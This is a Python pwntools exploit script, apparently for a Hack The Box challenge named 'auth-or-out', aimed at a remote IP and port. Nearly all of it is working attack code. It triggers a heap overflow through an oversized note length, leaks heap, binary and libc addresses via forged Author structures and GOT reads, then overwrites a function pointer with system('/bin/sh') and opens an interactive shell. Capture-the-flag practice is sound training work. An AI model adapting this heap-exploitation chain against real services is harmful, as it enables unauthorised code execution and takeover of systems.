import dataclasses
import ipaddress
import pathlib
from loguru import logger
from core.target_config import Config, Mode
from core.targetbase import TargetBase
from custom.auth_or_out import AuthOrOutPwn
from pwn import p64, u64

from modules.find_function import FindFunction, Method
from modules.get_libc_address import GetLibcAddress


@dataclasses.dataclass
class Author:
    name: bytes = b''
    surname: bytes = b''
    note_address: int = 0
    age: int = 0
    print_ptr: int = 0

    def deserialize(self) -> bytes:
        return (
            self.name.rjust(16, b'\x41') +
            self.surname.rjust(16, b'\x41') +
            p64(self.note_address) +
            p64(self.age) +
            p64(self.print_ptr)
        )


def create_author(name: bytes, surname: bytes, age: int, note_size: int, data: bytes):
    print(t.process.clean(0.3).decode())
    t.process.sendline(b'1')
    t.process.recvline()
    print(t.process.clean(0.2).decode(), name)
    t.process.sendline(name)
    print(t.process.clean(0.2).decode(), surname)
    t.process.sendline(surname)
    print(t.process.clean(0.2).decode(), age)
    t.process.sendline(str(age).encode())
    print(t.process.clean(0.2).decode(), note_size)
    t.process.sendline(str(note_size).encode())
    print(t.process.clean(0.2).decode(), data)
    t.process.sendline(data)
    result = t.process.recvline()
    return result.decode().split()[1]


def delete_author(author_id: str):
    print(t.process.clean(0.3).decode())
    t.process.sendline(b"4")
    print(t.process.clean(0.2).decode(), author_id)
    t.process.sendline(author_id.encode())
    print(t.process.clean(0.2).decode())


def print_author(author_id: str) -> dict:
    print(t.process.clean(0.3).decode())
    t.process.sendline(b"3")
    print(t.process.clean(0.2).decode(), author_id)
    t.process.sendline(author_id.encode())
    t.process.recvline()
    t.process.recvline()
    t.process.recvline()
    author = {
        "name": t.process.recvline().split(b' ', maxsplit=1)[1],
        "surname": t.process.recvline().split(b' ', maxsplit=1)[1],
        "age": t.process.recvline(),
        "note": t.process.recvline(),
    }
    t.process.clean()
    return author


if __name__ == '__main__':
    remote_config = Config(
        rop=True,
        mode=Mode.remote,
        ip=ipaddress.IPv4Address('165.22.124.179'),
        port=32735,
        file=pathlib.Path('/home/lim8en1/htb/projects/auth-or-out/challenge/auth-or-out'),
        no_offset=True,
        detect_libc=True
        # libc='libc6_2.27-3ubuntu1.4_amd64',
        # libc='libc6_2.28-10+deb10u1_amd64',
    )
    heap_overflow_size = 18446744073709551609
    t = TargetBase(pwn_target=AuthOrOutPwn, config=remote_config)
    id1 = create_author(b'test', b'lololol', 123, 8, data=b'AAAAAAAA')
    id2 = create_author(b'test12', b'lolol', 12, 8, data=b'/bin/sh')
    delete_author(id1)
    payload_frame = Author(name=b'X' * 16, surname=b'X' * 16)
    id1 = create_author(b'test12', b'lolol', 12, heap_overflow_size, data=b'Q' * 16 + payload_frame.deserialize()[:0x20])
    author2 = print_author(id2)
    buffer_address_raw = author2['surname'][16:-1]
    buffer_address = u64(buffer_address_raw.ljust(8, b'\0'))
    logger.success(f"Heap buffer@{hex(buffer_address)}")

    delete_author(id1)
    payload_frame = Author(note_address=buffer_address-8)
    id1 = create_author(b'test12', b'lolol', 12, heap_overflow_size,
                        data=b'Q' * 16 + payload_frame.deserialize()[:0x28])
    author2 = print_author(id2)
    print_note_address = u64(author2['note'].split(b' ', maxsplit=1)[1][1:-2].ljust(8, b'\0'))
    logger.success(f"PrintNote@{hex(print_note_address)}")
    base = print_note_address - t.file.symbols['PrintNote']
    t.file.address = base
    logger.success(f"base@{hex(print_note_address)}")

    result = FindFunction.execute(t, 'puts', Method.PLT)
    if not result:
        logger.critical(f"Failed to get a print function")
        exit(0)
    print_function_name, print_function_address = result
    result = FindFunction.execute(t, 'puts', Method.GOT)
    if not result:
        logger.critical(f"Failed to get a target function")
        exit(0)
    target_function_name, target_function_address = result

    addresses = []

    delete_author(id1)
    payload_frame = Author(note_address=target_function_address, print_ptr=print_function_address)
    id1 = create_author(b'test12', b'lolol', 12, heap_overflow_size,
                        data=b'Q' * 16 + payload_frame.deserialize())
    author2 = print_author(id2)
    address = u64(author2['note'][:-1].ljust(8, b'\0'))
    logger.success(f"{target_function_name}@{hex(address)}")
    addresses.append((target_function_name, address))

    result = FindFunction.execute(t, 'printf', Method.GOT)
    if not result:
        logger.critical(f"Failed to get a target function")
        exit(0)
    target_function_name, target_function_address = result

    delete_author(id1)
    payload_frame = Author(note_address=target_function_address, print_ptr=print_function_address)
    id1 = create_author(b'test12', b'lolol', 12, heap_overflow_size,
                        data=b'Q' * 16 + payload_frame.deserialize())
    author2 = print_author(id2)
    address = u64(author2['note'][:-1].ljust(8, b'\0'))
    logger.success(f"{target_function_name}@{hex(address)}")
    addresses.append((target_function_name, address))

    GetLibcAddress.libc_update_base_address(t, addresses)
    system_ptr = t.libc.symbols['system']
    bin_sh_string = b'/bin/sh\0'
    bin_sh_ptr = next(t.libc.search(bin_sh_string), None)
    if bin_sh_ptr is None:
        logger.critical(f"Failed to find /bin/sh in libc")
        exit(0)
    delete_author(id1)
    payload_frame = Author(note_address=bin_sh_ptr, print_ptr=system_ptr)
    id1 = create_author(b'test12', b'lolol', 12, heap_overflow_size,
                        data=b'Q' * 16 + payload_frame.deserialize())
    print(t.process.clean(0.3).decode())
    t.process.sendline(b"3")
    t.process.sendline(id2)
    t.process.interactive()

